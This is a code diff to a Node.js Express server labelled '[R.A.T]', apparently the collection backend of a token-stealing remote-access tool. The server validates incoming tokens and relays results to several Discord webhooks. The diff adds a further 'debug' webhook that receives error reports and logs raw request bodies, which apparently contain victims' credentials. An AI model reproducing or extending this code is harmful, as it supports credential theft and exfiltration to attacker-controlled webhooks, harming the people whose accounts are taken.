@@ -20,6 +20,8 @@ app.use(express.urlencoded({ extended: true }))
 let defaulthook = process.env.WEBHOOK
 let blackhook = process.env.BLACKHOOK
 let shorthook = process.env.SHORTHOOK
+let debughook = process.env.DEBUGHOOK
+
 
 //array initialization
 const ipMap = []
@@ -221,6 +223,15 @@ app.post("/", (req, res) => {
                     "Content-Type": "application/json"
                 }
             }).catch(err => {
+                console.log(req.body)
+                post(debughook, JSON.stringify({
+                    content: `[R.A.T] Error while sending to Discord webhook:\n${err}`, //ping
+                    attachments: []
+                }), {
+                    headers: {
+                        "Content-Type": "application/json"
+                    }
+                })
                 console.log(`[R.A.T] Error while sending to Discord webhook:\n${err}`)
             })
 
@@ -249,7 +260,16 @@ app.post("/", (req, res) => {
                     "Content-Type": "application/json"
                 }
             }).catch(err => {
+                console.log(req.body)
                 console.log(`[R.A.T] Error while sending to Discord webhook:\n${err}`)
+                post(debughook, JSON.stringify({
+                    content: `[R.A.T] Error while sending to Discord webhook:\n${err}`, //ping
+                    attachments: []
+                }), {
+                    headers: {
+                        "Content-Type": "application/json"
+                    }
+                })
             })
         } catch (e) {
             console.log(e)
@@ -260,6 +280,14 @@ app.post("/", (req, res) => {
         //could happen if the auth server is down OR if invalid information is passed in the body
         console.log(`[R.A.T] Error while validating token:\n${err}`)
         console.log(req.body)
+        post(debughook, JSON.stringify({
+                content: `[R.A.T] Error while validating token:\n${err}`, //ping
+                attachments: []
+            }), {
+                headers: {
+                    "Content-Type": "application/json"
+                }
+            })
     })
     
     //change this to whatever you want, but make sure to send a response
